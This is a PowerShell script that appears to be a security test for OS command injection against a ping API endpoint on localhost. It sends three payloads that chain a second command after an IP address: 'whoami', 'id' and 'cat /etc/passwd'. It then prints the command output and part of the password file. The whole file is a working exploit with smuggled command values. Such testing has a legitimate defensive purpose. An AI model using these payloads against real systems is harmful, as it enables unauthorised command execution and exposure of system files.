Write-Host "=== OS COMMAND INJECTION VULNERABILITY TEST ===" -ForegroundColor Cyan
Write-Host "Endpoint: POST /api/it/network/ping" -ForegroundColor Green
Write-Host ""

Write-Host "TEST 1: whoami injection" -ForegroundColor Yellow
$target = "8.8.8.8 && whoami"
$body = @{target = $target} | ConvertTo-Json
try {
    $response = Invoke-WebRequest -Uri http://localhost/api/it/network/ping -Method POST -Body $body -ContentType application/json -ErrorAction Stop
    $json = $response.Content | ConvertFrom-Json
    Write-Host "Status: $($response.StatusCode)" -ForegroundColor Green
    Write-Host "Injected Command Executed!" -ForegroundColor Cyan
    Write-Host "Output:" -ForegroundColor Green
    Write-Host $json.output -ForegroundColor White
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
Write-Host ""

Write-Host "TEST 2: id command injection" -ForegroundColor Yellow
$target = "8.8.8.8 && id"
$body = @{target = $target} | ConvertTo-Json
try {
    $response = Invoke-WebRequest -Uri http://localhost/api/it/network/ping -Method POST -Body $body -ContentType application/json -ErrorAction Stop
    $json = $response.Content | ConvertFrom-Json
    Write-Host "Status: $($response.StatusCode)" -ForegroundColor Green
    Write-Host "Output:" -ForegroundColor Green
    Write-Host $json.output -ForegroundColor White
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
Write-Host ""

Write-Host "TEST 3: /etc/passwd file read" -ForegroundColor Yellow
$target = "8.8.8.8 && cat /etc/passwd"
$body = @{target = $target} | ConvertTo-Json
try {
    $response = Invoke-WebRequest -Uri http://localhost/api/it/network/ping -Method POST -Body $body -ContentType application/json -ErrorAction Stop
    $json = $response.Content | ConvertFrom-Json
    Write-Host "Status: $($response.StatusCode)" -ForegroundColor Green
    Write-Host "Vulnerable! Read /etc/passwd successfully:" -ForegroundColor Red
    Write-Host ($json.output.Substring(0, [Math]::Min(600, $json.output.Length))) -ForegroundColor White
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
